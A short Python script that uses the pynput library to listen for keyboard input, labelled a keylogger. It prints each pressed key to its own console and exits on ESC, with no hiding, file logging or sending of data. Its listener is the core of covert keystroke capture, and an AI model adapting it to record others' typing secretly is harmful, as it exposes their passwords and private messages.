from pynput import keyboard

print("Starting keylogger... Press ESC to stop.")

def on_press(key):
    try:
        print(f"Alphanumeric key pressed: {key.char}")
    except AttributeError:
        print(f"Special key pressed: {key}")

    # Stop listener on ESC key
    if key == keyboard.Key.esc:
        print("ESC pressed, exiting.")
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

